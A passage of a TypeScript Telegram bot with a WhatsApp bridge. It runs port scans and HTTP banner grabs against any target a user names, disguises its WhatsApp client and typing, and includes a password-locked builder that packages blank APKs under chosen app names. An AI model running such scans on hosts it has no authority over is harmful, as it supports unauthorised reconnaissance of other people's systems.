            socket.on('connect', () => { openPorts.push(port); socket.destroy(); resolve(); });
            socket.on('timeout', () => { socket.destroy(); resolve(); });
            socket.on('error', () => { socket.destroy(); resolve(); });
            socket.connect(port, targetIp);
          });
        };
        
        await Promise.all(importantPorts.map(p => checkPort(p)));
        let portInfo = openPorts.length > 0 ? `Open Ports: ${openPorts.join(', ')}` : "All Top 15 Ports Filtered/Closed";

        // [4] HTTP BANNER GRABBING
        let bannerInfo = "HTTP Unreachable";
        try {
           const httpRes = await fetch(`http://${target}`, { timeout: 2000 } as any);
           bannerInfo = `Status: ${httpRes.status}\nServer: ${httpRes.headers.get('server') || 'Unknown'}`;
        } catch (e) {
           bannerInfo = "No HTTP Response on port 80";
        }
        
        const finalTxt = `✅ <b>DEEP_SCAN_COMPLETED:</b> <code>${target}</code>\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `🌍 <b>[GEO-IP OSINT]</b>\n${ipInfo}\n\n` +
                         `🛡️ <b>[WHOIS REGISTRY]</b>\n${whoisInfo}\n\n` +
                         `⚙️ <b>[TCP PORT SCAN]</b>\n${portInfo}\n\n` +
                         `🌐 <b>[WEB BANNER GRAB]</b>\n${bannerInfo}\n` +
                         `━━━━━━━━━━━━━━━━━━━━\n` +
                         `<i>* Intel Engine v2 - Powered by Extreme OSINT</i>`;
                         
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, finalTxt, { parse_mode: 'HTML' });

      } catch (err) {
        ctx.telegram.editMessageText(ctx.chat.id, scanMsg.message_id, undefined, `❌ <b>Error Occured:</b>\nTarget down atau protected.`, { parse_mode: 'HTML' });
      }
    });

    let waConnecting = false;

    // We hook the telegram.callApi to intercept WhatsApp targeted messages
    const originalCallApi = bot.telegram.callApi.bind(bot.telegram);
    bot.telegram.callApi = async (method: string, payload: any, options?: any) => {
      if (payload && typeof payload.chat_id === 'string' && payload.chat_id.startsWith('@wa_')) {
          const jid = payload.chat_id.replace('@wa_', '') + '@s.whatsapp.net';
          if (globalWaSock) {
              if (method === 'sendMessage' || method === 'editMessageText') {
                  let text = payload.text || '';
                  text = text.replace(/<b>(.*?)<\/b>/g, '*$1*').replace(/<i>(.*?)<\/i>/g, '_$1_').replace(/<code>(.*?)<\/code>/g, '```$1```').replace(/<pre>(.*?)<\/pre>/s, '```$1```');
                  
                  // Convert Inline Keyboards to Text Options for WA Users
                  if (payload.reply_markup && payload.reply_markup.inline_keyboard) {
                      try {
                          // Note: Some payloads might be serialized strings, but Telegraf usually sends objects to callApi
                          const keyboard = typeof payload.reply_markup === 'string' ? JSON.parse(payload.reply_markup).inline_keyboard : payload.reply_markup.inline_keyboard;
                          if (keyboard && keyboard.length > 0) {
                              text += '\n\n🤖 *PILIHAN MENU:*\n';
                              keyboard.forEach((row: any[]) => {
                                  row.forEach((btn: any) => {
                                      if (btn.callback_data) {
                                          text += `👉 Ketik: *${btn.callback_data}* _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      } else if (btn.url) {
                                          text += `👉 Buka Web: ${btn.url} _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      }
                                  });
                              });
                          }
                      } catch(e) {}
                  }

                  // Add simulate typing before sending
                  await globalWaSock.sendPresenceUpdate('composing', jid);
                  await new Promise(r => setTimeout(r, 1000 + Math.random()*1500));
                  await globalWaSock.sendPresenceUpdate('paused', jid);

                  await globalWaSock.sendMessage(jid, { text });
                  return { message_id: Date.now() }; 
              } else if (method === 'sendPhoto') {
                  let caption = payload.caption || '';
                  caption = caption.replace(/<b>(.*?)<\/b>/g, '*$1*').replace(/<i>(.*?)<\/i>/g, '_$1_').replace(/<code>(.*?)<\/code>/g, '```$1```').replace(/<pre>(.*?)<\/pre>/s, '```$1```');
                  
                  if (payload.reply_markup && payload.reply_markup.inline_keyboard) {
                      try {
                          const keyboard = typeof payload.reply_markup === 'string' ? JSON.parse(payload.reply_markup).inline_keyboard : payload.reply_markup.inline_keyboard;
                          if (keyboard && keyboard.length > 0) {
                              caption += '\n\n🤖 *PILIHAN MENU:*\n';
                              keyboard.forEach((row: any[]) => {
                                  row.forEach((btn: any) => {
                                      if (btn.callback_data) {
                                          caption += `👉 Ketik: *${btn.callback_data}* _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      } else if (btn.url) {
                                          caption += `👉 Buka Web: ${btn.url} _(${btn.text.replace(/<[^>]*>?/gm, '')})_\n`;
                                      }
                                  });
                              });
                          }
                      } catch(e) {}
                  }

                  await globalWaSock.sendPresenceUpdate('composing', jid);
                  await new Promise(r => setTimeout(r, 1500));
                  await globalWaSock.sendPresenceUpdate('paused', jid);

                  let source = payload.photo;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { image: source, caption });
                  return { message_id: Date.now() }; 
              } else if (method === 'sendAudio' || method === 'sendVoice') {
                  let source = payload.audio || payload.voice;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { audio: source, mimetype: 'audio/mp4' });
                  return { message_id: Date.now() };
              } else if (method === 'sendDocument') {
                  let source = payload.document;
                  if (typeof source === 'object' && source.source) source = source.source;
                  await globalWaSock.sendMessage(jid, { document: source, mimetype: 'application/octet-stream', fileName: 'file' });
                  return { message_id: Date.now() };
              }
          }
          return { message_id: Date.now() }; // Return fake success if WA disconnected but targeted at WA
      }
      return originalCallApi(method, payload, options);
    };

    const startWAConnection = async (ctx?: any) => {
      const sessionDir = `./wa_auth_global`;
      try {
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        
        if (typeof makeWASocket !== 'function') {
           throw new Error("Initialization error: makeWASocket is " + (typeof makeWASocket));
        }

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: false,
          browser: ['Windows', 'Chrome', '120.0.0.0'], // Safe web interface masking
          syncFullHistory: false,
          markOnlineOnConnect: true,
          generateHighQualityLinkPreview: true,
          defaultQueryTimeoutMs: undefined
        });
        
        sock.ev.on('creds.update', saveCreds);
        
        let lastQrMessageId: number | null = null;
        let qrCount = 0;

        sock.ev.on('connection.update', async (update: any) => {
          const { connection, lastDisconnect, qr } = update;
          
          if (qr && ctx) {
            qrCount++;
            if (qrCount > 5) {
               waConnecting = false;
               if (lastQrMessageId) {
                  ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
               }
               ctx.reply("❌ <b>Koneksi Dibatalkan</b>\nQR code tidak di-scan setelah beberapa menit. Silahkan ulangi perintah /wa_connect jika ingin menyambungkan kembali.", { parse_mode: 'HTML' }).catch(() => {});
               try {
                  sock.logout().catch(() => {});
                  sock.end(undefined);
               } catch(e){}
               return;
            }

            try {
              const qrBuffer = await QRCode.toBuffer(qr);
              if (lastQrMessageId) {
                 await ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
              }
              const qrMsg = await ctx.telegram.sendPhoto(ctx.chat.id, { source: qrBuffer }, { caption: `📱 <b>SCAN QR INI [Percobaan ${qrCount}/5]</b>\nBuka WhatsApp > Perangkat Tertaut > Tautkan Perangkat. QR ini berlaku 20 detik.`, parse_mode: 'HTML' }).catch(() => null);
              if (qrMsg) {
                 lastQrMessageId = qrMsg.message_id;
              }
            } catch(e) {
              if (ctx) ctx.reply("❌ Gagal mengenerate QR code.").catch(() => {});
            }
          }
          
          if (connection === 'close') {
            globalWaSock = null;
            const statusCode = (lastDisconnect?.error as any)?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            console.log('WA connection closed, reconnecting:', shouldReconnect);
            if (shouldReconnect) {
               if (ctx) ctx.reply("⚠️ Koneksi WA terputus, mencoba relogin otomatis (pastikan tidak log out dari aplikasi).").catch(() => {});
               setTimeout(() => startWAConnection(ctx), 5000);
            } else {
               if (ctx) ctx.reply("❌ Sesi WA Logged Out. Silakan hapus folder auth WA dan /wa_connect ulang.").catch(() => {});
               waConnecting = false;
               try { fs.rmSync(sessionDir, { recursive: true, force: true }); } catch(err){}
            }
          } else if (connection === 'open') {
             globalWaSock = sock;
             if (lastQrMessageId && ctx) {
                ctx.telegram.deleteMessage(ctx.chat.id, lastQrMessageId).catch(() => {});
             }
             if (ctx) ctx.reply("✅ <b>WHATSAPP BOT TERHUBUNG!</b>\nNomor ini sekarang merespon otomatis.", { parse_mode: 'HTML' }).catch(() => {});
             else console.log("✅ WA Auto-Connected on Startup");
             waConnecting = false;
          }
        });
        
        sock.ev.on('messages.upsert', async ({ messages, type }: any) => {
           if (type !== 'notify') return;
           const m = messages[0];
           if (m.key.fromMe) return;
           
           const jid = m.key.remoteJid;
           if (!jid || jid.includes('@g.us')) return; // Ignore groups to avoid ban/spam
           
           const senderNumber = jid.split('@')[0];
           const text = m.message?.conversation || m.message?.extendedTextMessage?.text || "";
           
           if (text) {
             await sock.readMessages([m.key]).catch(()=>{});
             
             // Convert direct text input for Callbacks to CallbackQuery Fake Event
             let isCallback = false;
             const knownCallbacks = ['menu_main', 'menu_tools', 'menu_traps', 'menu_db', 'confirm_verified', 'decline_verified', 'menu_settings'];
             if (knownCallbacks.some(cb => text.includes(cb))) {
                 isCallback = true;
             }
             
             if (isCallback) {
                 const matchedCb = knownCallbacks.find(cb => text.includes(cb));
                 const fakeUpdate = {
                     update_id: Math.floor(Math.random() * 10000000),
                     callback_query: {
                         id: Math.floor(Math.random() * 10000000).toString(),
                         from: { id: parseInt(senderNumber) || 0, is_bot: false, first_name: m.pushName || "WA User" },
                         message: {
                             chat: { id: `@wa_${senderNumber}`, type: 'private' },
                             message_id: Math.floor(Math.random() * 10000)
                         },
                         data: matchedCb
                     }
                 };
                 bot.handleUpdate(fakeUpdate as any).catch(console.error);
                 return;
             }

             let entities: any[] = [];
             if (text.startsWith('/')) {
                 entities.push({ type: 'bot_command', offset: 0, length: text.split(' ')[0].length });
             }

             const fakeUpdate = {
                 update_id: Math.floor(Math.random() * 10000000),
                 message: {
                     message_id: Math.floor(Math.random() * 10000),
                     from: { id: parseInt(senderNumber) || 0, is_bot: false, first_name: m.pushName || "WA User" },
                     chat: { id: `@wa_${senderNumber}`, type: 'private' },
                     date: Math.floor(Date.now()/1000),
                     text: text,
                     entities: entities.length > 0 ? entities : undefined
                 }
             };
             
             bot.handleUpdate(fakeUpdate as any).catch(console.error);
           }
        });
        
      } catch (err: any) {
        waConnecting = false;
        if (ctx) ctx.reply("❌ Gagal memulai WA Bot: " + err.message).catch(() => {});
      }
    };

    if (fs.existsSync('./wa_auth_global/creds.json')) {
       console.log("Found WA session, attempting auto-connect...");
       startWAConnection();
    }

    bot.command('wa_login', async (ctx) => {
      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
      }
      ctx.reply("✅ Anda adalah Admin Owner utama. Sesi terverifikasi otomatis tanpa password!", {parse_mode: 'HTML'});
    });

    bot.command('wa_connect', async (ctx) => {
      if (!ctx.from || ctx.from.id !== ADMIN_ID) {
        return ctx.reply("🔒 <b>Akses Terpental</b>\nMaaf, fitur integrasi WhatsApp Bot khusus untuk <b>Admin Owner</b> saja.", {parse_mode: 'HTML'});
      }
      if (globalWaSock) return ctx.reply("✅ WA Bot sudah terkoneksi sebelumnya.");
      if (waConnecting) return ctx.reply("⏳ Sedang mencoba koneksi WA, mohon tunggu...");
      waConnecting = true;
      const progressMsg = await ctx.reply("🔄 Memulai session Baileys WhatsApp...").catch(() => null);
      startWAConnection(ctx);
    });

    // MIKKO_APK BLANK PACKAGE BUILDER SYSTEM (Password-locked: 1928)
    bot.command('mikkoapk', async (ctx) => {
      try {
        const text = ctx.message?.text || "";
        const parts = text.split(" ");
        const passwordArg = parts[1];
        
        if (!passwordArg) {
          return ctx.reply("📲 <b>MIKKO_APK V.1 (Blank Compiler)</b> 📲\n" +
                           "━━━━━━━━━━━━━━━━━━━━━\n" +
                           "Alat penyusun file APK kosong (blank template) murni untuk pembelajaran dan analisis.\n\n" +
                           "<b>Format Perintah:</b>\n" +
                           "<code>/mikkoapk [keamanan_sandi] [nama.paket] [Nama Aplikasi]</code>\n\n" +
                           "<b>Contoh:</b>\n" +
                           "<code>/mikkoapk [sandi_akses] com.mikko.blank AppSaya</code>\n\n" +
                           "<i>Kunci verifikasi sah sandi: Terproteksi/Hubungi Owner</i>", { parse_mode: 'HTML' });
        }

        if (passwordArg !== '1928') {
          return ctx.reply("❌ <b>Sandi Verifikasi Salah!</b>\nSilahkan berikan sandi verifikasi pembelajaran yang sah untuk merakit MikkoAPK.", { parse_mode: 'HTML' });
        }

        const packageNameArg = parts[2] || "com.mikko.emptyapp";
        const appTitleArg = parts.slice(3).join(" ") || "Mikko Blank App";

        const pName = packageNameArg.replace(/[^a-zA-Z0-9.]/g, '');
        const aTitle = appTitleArg.replace(/[\\"]/g, '');

        const processingMsg = await ctx.reply("⏳ <b>Menghubungkan ke compiler...</b>\nMerakit lembar Manifest dan dex buffer...").catch(() => null);

        const zip = new AdmZip();

        // Compiled classes.dex empty header buffer (minimum 112 bytes)
        const dexBytes = Buffer.from([
          0x64, 0x65, 0x78, 0x0a, 0x30, 0x33, 0x35, 0x00, 0x56, 0x56, 0xc0, 0x07, 0xf6, 0x1f, 0x22, 0xd8, 
          0x3c, 0xc1, 0x6f, 0xc9, 0xb9, 0xb5, 0xbc, 0x57, 0x18, 0x1e, 0x98, 0xc9, 0xd0, 0x37, 0xbc, 0x77, 
          0x70, 0x00, 0x00, 0x00, 0x78, 0x00, 0x00, 0x00, 0x78, 0x56, 0x34, 0x12, 0x00, 0x00, 0x00, 0x00, 
          0x00, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x70, 0x00, 0x00, 0x00, 
          0x01, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
          0x01, 0x00, 0x00, 0x00, 0x5c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ]);

        const manifestXml = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="${pName}"
    android:versionCode="1"
    android:versionName="1.0">
    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33" />
    <application
        android:label="${aTitle}"
        android:allowBackup="true"
        android:supportsRtl="true">
        <activity
            android:name="com.mikko.emptyapp.MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>`;

        const stringsXml = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">${aTitle}</string>
</resources>`;

        const licenseText = `========================================================
MIKKO_APK CLEARANCE LICENSE Certificate
========================================================
Security Clearance: VERIFIED
Target Package: ${pName}
Application Name: ${aTitle}
Min SDK: 21 // Target SDK: 33
Build Engine: MikkoAPK Compiler v1.4

Academic and Educational Use Only.
This Android package (.apk) is generated completely clean and empty
for forensic structural check and local binary learning.
There are no background services or permissions associated.
========================================================`;

        zip.addFile("AndroidManifest.xml", Buffer.from(manifestXml, 'utf-8'));
        zip.addFile("classes.dex", dexBytes);
        zip.addFile("res/values/strings.xml", Buffer.from(stringsXml, 'utf-8'));
        zip.addFile("assets/mikko_license.txt", Buffer.from(licenseText, 'utf-8'));

        const apkBuffer = zip.toBuffer();

        if (processingMsg) {
          ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id).catch(() => {});
        }

        await ctx.replyWithDocument({
          source: apkBuffer,
          filename: `MikkoAPK_${pName}.apk`
        }, {
          caption: `✅ <b>MikkoAPK Terbuat Berhasil!</b>\n` +
                   `Nama Paket: <code>${pName}</code>\n` +
                   `Judul App: <code>${aTitle}</code>\n` +
                   `Status: <b>Empty Blank App (Aman & Clean)</b>\n\n` +
                   `Akses: <b>Sukses Terverifikasi</b>\n` +
                   `Dirancang khusus untuk keperluan pembelajaran & analisis forensik mendalam.`,
          parse_mode: 'HTML'
        });
      } catch (err: any) {
        ctx.reply("❌ Gagal merakit APK kosong: " + err.message);
      }
    });

    // ALARM SYSTEM
    const activeAlarms = new Map<number, any[]>();

    bot.command('alarm', (ctx) => {
      const args = ctx.message.text.split(' ')[1];
      if (!args) return ctx.reply("Format: /alarm [menit] atau /alarm [hh:mm]");

      let ms = 0;
      let label = "";

      if (args.includes(':')) {
        const [h, m] = args.split(':').map(Number);
        if (isNaN(h) || isNaN(m) || h < 0 || h > 23 || m < 0 || m > 59) {
          return ctx.reply("❌ Format jam salah. Gunakan HH:MM (0-23:0-59)");
        }
        const now = new Date();
        const target = new Date();
        target.setHours(h, m, 0, 0);
        if (target.getTime() <= now.getTime()) {
           target.setDate(target.getDate() + 1); // Besok
        }
        ms = target.getTime() - now.getTime();
        label = `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}`;
      } else {
        const mins = parseInt(args);
        if (isNaN(mins) || mins <= 0) return ctx.reply("❌ Masukkan jumlah menit yang valid.");
        ms = mins * 60 * 1000;
        label = `${mins} menit lagi`;
      }

      if (ms > 24 * 60 * 60 * 1000 * 7) return ctx.reply("❌ Alarm maksimal 7 hari.");

      const alarmId = setTimeout(() => {
        ctx.reply(`⏰ <b>ALARM BUNYI!</b>\n━━━━━━━━━━━━━\nWaktu: ${label}`, { parse_mode: 'HTML' });
        const userAlarms = activeAlarms.get(ctx.from.id) || [];
        activeAlarms.set(ctx.from.id, userAlarms.filter(a => a.id !== alarmId));
      }, ms);

      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      userAlarms.push({ id: alarmId, time: label, targetTime: Date.now() + ms });
      activeAlarms.set(ctx.from.id, userAlarms);

      ctx.reply(`✅ <b>Alarm diset!</b>\nSekitar: ${label}`, { parse_mode: 'HTML' });
    });

    bot.command('listalarm', (ctx) => {
      const userAlarms = activeAlarms.get(ctx.from.id) || [];
      if (userAlarms.length === 0) return ctx.reply("📭 Tidak ada alarm aktif.");

      let msg = `⏰ <b>ALARM AKTIF ANDA</b>\n━━━━━━━━━━━━━\n`;
      userAlarms.forEach((a, i) => {
        const remaining = Math.round((a.targetTime - Date.now()) / 60000);
        msg += `${i+1}. <b>${a.time}</b> (~${remaining} mnt lagi)\n`;
      });
      ctx.reply(msg, { parse_mode: 'HTML' });
    });

    process.once('SIGINT', () => bot && bot.stop('SIGINT'));
    process.once('SIGTERM', () => bot && bot.stop('SIGTERM'));
  } else {
    console.log("TELEGRAM_BOT_TOKEN not provided, skipping Telegram bot setup.");
  }

  const server = app.listen(PORT, "0.0.0.0", () => {
    console.log(`[${new Date().toISOString()}] SERVER ONLINE ON PORT ${PORT}`);
    console.log(`[${new Date().toISOString()}] HOST: ${appHost}`);

    // LAUNCH BOT ONLY AFTER SERVER IS LISTENING
    if (bot && token) {
      // Use Polling for better stability on Railway
      console.log(`[BOT] STARTING POLLING MODE...`);
      bot.launch({ dropPendingUpdates: true }).then(() => {
        console.log(`[BOT] ✅ BOT ONLINE (POLLING)`);
      }).catch(err => {
        if (err.code === 409) {
           console.warn(`[BOT] WARNING: Bot already running elsewhere. Links will still work but polling is limited.`);
        } else {
           console.error(`[BOT] ❌ LAUNCH ERROR:`, err.message);
        }
      });
    }
  });

  server.on('error', (err: any) => {
    console.error(`[${new Date().toISOString()}] CRITICAL SERVER ERROR:`, err);
    process.exit(1);
  });

  // Global uncaught exceptions handler
  process.on('uncaughtException', (err) => {
    console.error('[UNCAUGHT EXCEPTION]', err);
  });
  process.on('unhandledRejection', (reason, promise) => {
    console.error('[UNHANDLED REJECTION] at:', promise, 'reason:', reason);
  });
}

startServer().catch(err => {
  console.error("FATAL ERROR DURING STARTUP:", err);
  process.exit(1);
});
